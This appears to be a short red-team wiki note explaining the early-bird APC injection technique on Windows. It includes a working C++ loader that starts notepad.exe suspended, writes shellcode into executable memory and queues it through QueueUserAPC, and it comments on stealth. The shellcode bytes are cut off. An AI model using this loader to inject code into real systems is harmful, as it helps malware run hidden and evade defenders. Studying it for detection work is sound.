This injection is similar to the normal [[apc_injection]] technique, but this injection **creates a new process** and does not use an existing process.
The idea is to create a process that will be initiated in a suspended way (no execution). After that, the payload is allocated in the process space and then the shellcode is inserted in the APC queue.
As we have control over this new created process, we can turn the thread of the process into an alertable state, so the APC queue is executed and therefore the shellcode is executed.

The basic difference is that, as we are creating a process, we have control over the state of the process and we can turn it into an alertable state; that is why this APC technique is more used, although it is less stealthy as we are not injecting into an existing process.

Here is an snippet of code:
```c++
int main() {

	unsigned char payload[] = {
	  0xfc, 0x48, 0x83, ...
	};

	size_t payload_size = sizeof(payload);
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	CreateProcessA("notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi); // We creaete the process in suspended state.
	HANDLE hVictimProcess = pi.hProcess;
	HANDLE hThread = pi.hThread;

	LPVOID lpShellcodeAddress = VirtualAllocEx(hVictimProcess, NULL, payload_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // We create a memory region in the suspended process
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE) lpShellcodeAddress; // Create the routine that points to the shellcode

	WriteProcessMemory(hVictimProcess, lpShellcodeAddress, payload, payload_size, NULL); // We write the shellcode in the memory region
	QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL); // Add the APC routine to the APC queue

	ResumeThread(hThread);

	return EXIT_SUCCESS;

}
```